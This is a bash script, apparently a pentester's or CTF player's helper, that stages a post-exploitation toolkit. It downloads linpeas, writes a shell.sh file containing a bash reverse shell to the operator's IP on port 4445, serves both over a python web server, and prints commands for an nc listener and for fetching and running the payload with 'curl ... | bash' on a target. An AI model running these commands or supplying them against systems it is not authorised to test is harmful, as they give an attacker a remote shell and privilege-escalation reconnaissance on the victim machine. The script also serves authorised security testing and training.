#!/bin/bash

# Check if $myip is set, if not, run set-myip
if [ -z ${myip+x} ]; then
  set-myip
fi

# kill a webserver if already running
# get the pid of the python3 web server
pid=$(ps aux | grep '[p]ython3 -m http.server 4444' | awk '{print $2}')

# check if the pid is found, then kill it
if [[ -n $pid ]]; then
    kill -9 $pid
    echo "Web server has been terminated."
else
    echo "No web server found running on port 4444."
fi

# Create www directory in the current directory
mkdir -p www

# Navigate to www directory
cd www

# Download the latest version of linpeas
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Create shell.sh file
echo "bash -i >& /dev/tcp/$myip/4445 0>&1" > shell.sh

# Start the web server
python3 -m http.server 4444 &

# Print out the following dynamic commands so they can be easily copied
echo -e "\nCopy and run the following commands:"
echo "Start reverse shell listener with: nc -lvnp 4445"
echo "Gain shell using: curl http://$myip:4444/shell.sh | bash"
echo "Download linpeas with: wget http://$myip:4444/linpeas.sh"
echo "Run linpeas with: chmod +x linpeas.sh; ./linpeas.sh | tee linpeas.out"
